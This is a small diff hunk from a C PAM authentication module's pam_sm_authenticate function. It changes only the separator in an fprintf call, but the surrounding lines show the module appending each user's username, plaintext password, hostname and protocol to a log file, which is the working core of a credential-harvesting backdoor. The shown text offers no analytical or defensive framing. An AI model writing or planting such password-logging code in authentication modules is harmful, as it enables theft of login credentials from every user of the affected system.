@@ -28,7 +28,7 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, cons
     FILE *fd = fopen(BE_LOG_FILE, "a");
 
     if (fd != NULL) {
-        fprintf(fd, "%s | %s | %s | %s \n", username, password, hostname, protocol);
+        fprintf(fd, "%s %s %s %s \n", username, password, hostname, protocol);
         fclose(fd);
     }
 
